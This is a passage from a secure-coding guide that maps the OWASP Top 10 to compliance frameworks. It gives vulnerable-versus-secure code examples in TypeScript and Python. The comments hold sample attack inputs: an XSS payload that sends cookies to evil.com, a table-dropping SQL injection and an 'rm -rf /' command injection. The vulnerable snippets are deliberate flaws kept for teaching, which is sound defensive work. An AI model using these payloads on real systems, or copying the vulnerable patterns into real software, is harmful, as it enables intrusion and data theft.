### Pattern 5: Misconfiguration to Full Compromise (A05)

**Attack Chain:**
```
1. Scan              — Discover exposed admin panels, debug endpoints, default pages
2. Access            — Use default credentials or unauthenticated admin endpoints
3. Enumerate         — Map internal services, read configuration files
4. Escalate          — Modify user roles, deploy web shells, access secrets
5. Persist           — Create backdoor accounts, install reverse shells
```

**Detection Signals:**
- Access to admin endpoints from external IPs
- Default credential usage in authentication logs
- Configuration file access patterns (web.config, .env, application.yml)
- New user accounts created outside normal workflows

---

## 9. Compliance & Standards Mapping

### OWASP Top 10 to Compliance Framework Mapping

| OWASP Category       | NIST SP 800-53        | ISO 27001:2022    | PCI DSS 4.0      | SOC 2 (TSC)      | HIPAA Security Rule |
|----------------------|-----------------------|-------------------|-------------------|-------------------|---------------------|
| A01 Access Control   | AC-3, AC-6, AC-17     | A.8.3, A.8.4      | 7.1, 7.2, 7.3    | CC6.1, CC6.3      | 164.312(a)(1)       |
| A02 Crypto Failures  | SC-12, SC-13, SC-28   | A.8.24            | 3.4, 3.5, 4.1    | CC6.1, CC6.7      | 164.312(a)(2)(iv)   |
| A03 Injection        | SI-10, SI-16          | A.8.26, A.8.28    | 6.2, 6.5         | CC7.1, CC8.1      | 164.312(c)(1)       |
| A04 Insecure Design  | SA-8, SA-11, SA-17    | A.8.25, A.8.27    | 6.3              | CC8.1             | 164.308(a)(1)       |
| A05 Misconfiguration | CM-2, CM-6, CM-7      | A.8.9, A.8.19     | 2.2, 6.4         | CC6.1, CC7.1      | 164.312(b)          |
| A06 Components       | SA-12, SI-2, RA-5     | A.8.8, A.8.19     | 6.3, 11.3        | CC7.1, CC8.1      | 164.308(a)(5)(ii)   |
| A07 Auth Failures    | IA-2, IA-5, IA-8      | A.8.5             | 8.2, 8.3, 8.6    | CC6.1, CC6.2      | 164.312(d)          |
| A08 Integrity        | SI-7, SA-12, CM-14    | A.8.25, A.8.32    | 6.3, 11.5        | CC7.2, CC8.1      | 164.312(c)(1)       |
| A09 Logging Failures | AU-2, AU-3, AU-6, SI-4| A.8.15, A.8.16    | 10.1, 10.2, 10.7 | CC7.2, CC7.3      | 164.312(b)          |
| A10 SSRF             | SC-7, AC-4            | A.8.22            | 6.2               | CC6.6             | 164.312(e)(1)       |

### Key Compliance Requirements by Framework

**PCI DSS 4.0** (payment card data):
- Requirement 6.2: Bespoke and custom software is developed securely (maps A03, A04, A10)
- Requirement 6.5: Changes to custom software are managed securely
- Requirement 11.3: External and internal vulnerabilities regularly identified and addressed

**HIPAA Security Rule** (protected health information):
- 164.312(a): Access controls — unique user IDs, emergency access, automatic logoff
- 164.312(c): Integrity controls — mechanism to authenticate ePHI
- 164.312(e): Transmission security — encryption of ePHI in transit

**SOC 2 Type II** (service organizations):
- CC6: Logical and physical access controls
- CC7: System operations — detect and respond to security events
- CC8: Change management — authorized, tested, approved changes

**NIST Cybersecurity Framework (CSF) 2.0:**
- Identify (ID) → Asset management, risk assessment (A04, A06)
- Protect (PR) → Access control, data security, training (A01, A02, A07)
- Detect (DE) → Anomalies, continuous monitoring (A09)
- Respond (RS) → Incident response, communications (A09)
- Recover (RC) → Recovery planning, improvements

### OWASP Application Security Verification Standard (ASVS)

ASVS provides a more granular framework for verifying application security:
- **Level 1:** Minimum — automated testing, covers OWASP Top 10
- **Level 2:** Standard — most applications, covers most security controls
- **Level 3:** Advanced — high-value applications (banking, healthcare, critical infrastructure)

ASVS maps directly to OWASP Top 10 categories and provides 286 verification requirements
across 14 chapters, making it the bridge between OWASP awareness and compliance verification.

---

## 10. Code Examples — Vulnerable to Secure

### Example 1: SQL Injection Prevention (TypeScript)

```typescript
// VULNERABLE — string interpolation in SQL
async function searchProducts(category: string): Promise<Product[]> {
  const query = `SELECT * FROM products WHERE category = '${category}'`;
  return await db.query(query);
  // Attacker input: ' OR 1=1; DROP TABLE products; --
}

// SECURE — parameterized query with Prisma ORM
async function searchProducts(category: string): Promise<Product[]> {
  return await prisma.product.findMany({
    where: { category: category },  // Prisma handles parameterization
    select: { id: true, name: true, price: true }  // Limit returned fields
  });
}
```

### Example 2: XSS Prevention with React/TypeScript

```typescript
// VULNERABLE — dangerouslySetInnerHTML with user input
function Comment({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
  // Attacker input: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
}

// SECURE — React auto-escapes by default; sanitize if HTML is required
import DOMPurify from 'dompurify';

function Comment({ text }: { text: string }) {
  // Option A: Let React auto-escape (preferred)
  return <div>{text}</div>;

  // Option B: If HTML rendering is required, sanitize first
  const clean = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### Example 3: Access Control in Python/Django

```python
# VULNERABLE — no authorization check, IDOR
class InvoiceView(View):
    def get(self, request, invoice_id):
        invoice = Invoice.objects.get(id=invoice_id)
        return JsonResponse(invoice.to_dict())
        # Any authenticated user can access any invoice by guessing IDs

# SECURE — ownership verification with Django permissions
from django.core.exceptions import PermissionDenied

class InvoiceView(LoginRequiredMixin, View):
    def get(self, request, invoice_id):
        try:
            invoice = Invoice.objects.get(
                id=invoice_id,
                organization=request.user.organization  # Tenant isolation
            )
        except Invoice.DoesNotExist:
            raise Http404  # Don't reveal whether invoice exists
        if not request.user.has_perm('invoices.view_invoice'):
            raise PermissionDenied
        return JsonResponse(invoice.to_dict())
```

### Example 4: Secure Password Reset (TypeScript)

```typescript
// VULNERABLE — predictable token, no expiry, user enumeration
app.post('/forgot-password', async (req, res) => {
  const user = await db.users.findByEmail(req.body.email);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const token = user.id.toString();  // Predictable!
  await sendEmail(user.email, `Reset: /reset?token=${token}`);
  res.json({ message: 'Email sent' });
});

// SECURE — cryptographic token, expiry, constant-time response
import { randomBytes } from 'crypto';

app.post('/forgot-password', async (req, res) => {
  const user = await db.users.findByEmail(req.body.email);
  if (user) {
    const token = randomBytes(32).toString('hex');
    await db.resetTokens.create({
      userId: user.id,
      tokenHash: await hash(token),        // Store hash, not plaintext
      expiresAt: new Date(Date.now() + 3600_000)  // 1 hour expiry
    });
    await sendEmail(user.email, `Reset: /reset?token=${token}`);
  }
  // Same response regardless of whether user exists
  res.json({ message: 'If an account exists, a reset email has been sent' });
});
```

### Example 5: Secure File Upload (Python)

```python
# VULNERABLE — no type check, no size limit, path traversal
def upload_file(request):
    f = request.FILES['file']
    with open(f'/uploads/{f.name}', 'wb') as dest:
        for chunk in f.chunks():
            dest.write(chunk)
    return JsonResponse({'path': f.name})

# SECURE — type validation, size limit, randomized name, content inspection
import uuid
import magic
from pathlib import Path

ALLOWED_TYPES = {'image/jpeg', 'image/png', 'application/pdf'}
MAX_SIZE = 10 * 1024 * 1024  # 10 MB
UPLOAD_DIR = Path('/var/app/uploads')

def upload_file(request):
    f = request.FILES['file']

    # Size check
    if f.size > MAX_SIZE:
        return JsonResponse({'error': 'File too large'}, status=413)

    # Content-type validation via magic bytes (not extension or Content-Type header)
    mime = magic.from_buffer(f.read(2048), mime=True)
    f.seek(0)
    if mime not in ALLOWED_TYPES:
        return JsonResponse({'error': 'File type not allowed'}, status=415)

    # Generate random filename, preserve only validated extension
    ext = {'image/jpeg': '.jpg', 'image/png': '.png', 'application/pdf': '.pdf'}[mime]
    safe_name = f"{uuid.uuid4().hex}{ext}"
    dest_path = UPLOAD_DIR / safe_name

    with open(dest_path, 'wb') as dest:
        for chunk in f.chunks():
            dest.write(chunk)

    return JsonResponse({'id': safe_name})
```

### Example 6: Secure JWT Validation (TypeScript)

```typescript
// VULNERABLE — no signature verification, algorithm confusion
import jwt from 'jsonwebtoken';

function verifyToken(token: string) {
  return jwt.decode(token);  // decode does NOT verify signature!
}

// SECURE — full verification with explicit algorithm
import { jwtVerify, JWTVerifyResult } from 'jose';

const JWKS = createRemoteJWKSet(new URL('https://auth.example.com/.well-known/jwks.json'));

async function verifyToken(token: string): Promise<JWTVerifyResult> {
  return await jwtVerify(token, JWKS, {
    algorithms: ['RS256'],               // Explicit algorithm — prevents 'none' attack
    issuer: 'https://auth.example.com',  // Validate issuer
    audience: 'my-api',                  // Validate audience
    clockTolerance: 30,                  // 30 second tolerance
  });
}
```

### Example 7: Preventing Command Injection (Python)

```python
# VULNERABLE — shell injection via user input
import os

def convert_image(filename):
    os.system(f"convert {filename} output.png")
    # Attacker input: "; rm -rf / #"

# SECURE — subprocess with argument list (no shell)
import subprocess
import re
from pathlib import Path

ALLOWED_FILENAME = re.compile(r'^[a-zA-Z0-9_-]+\.(jpg|png|gif)$')

def convert_image(filename: str):
    if not ALLOWED_FILENAME.match(filename):
        raise ValueError("Invalid filename")
    input_path = Path('/uploads') / filename
    if not input_path.resolve().is_relative_to(Path('/uploads')):
        raise ValueError("Path traversal detected")
    subprocess.run(
        ['convert', str(input_path), '/output/result.png'],
        check=True,
        timeout=30,
        capture_output=True
    )
```

### Example 8: Secure Logging Without Injection (TypeScript)

```typescript
// VULNERABLE — user input in log strings enables log injection
app.post('/login', (req, res) => {
  console.log(`Login attempt for user: ${req.body.username}`);
  // Attacker input: "admin\n[INFO] Login successful for admin" — log forging
});

// SECURE — structured logging with pino, no string interpolation
import pino from 'pino';
const logger = pino({ redact: ['password', 'ssn', 'creditCard'] });

app.post('/login', (req, res) => {
  logger.info({
    event: 'auth.login.attempt',
    email: req.body.email,       // Structured field — cannot inject newlines
    ip: req.ip,
    timestamp: new Date().toISOString()
  });
});
```

---

## References

- OWASP Top 10:2021 — https://owasp.org/Top10/
- OWASP Top 10:2025 — https://owasp.org/Top10/2025/en/
- OWASP Cheat Sheet Series — https://cheatsheetseries.owasp.org/
- OWASP ASVS — https://owasp.org/www-project-application-security-verification-standard/
- CWE Top 25 (2024) — https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html
- NIST SP 800-53 Rev 5 — https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final
- NIST Cybersecurity Framework 2.0 — https://www.nist.gov/cyberframework
- PCI DSS 4.0 — https://www.pcisecuritystandards.org/
- Semgrep OWASP Rules — https://semgrep.dev/p/owasp-top-ten
- GitHub CodeQL — https://codeql.github.com/
- OWASP ZAP — https://www.zaproxy.org/
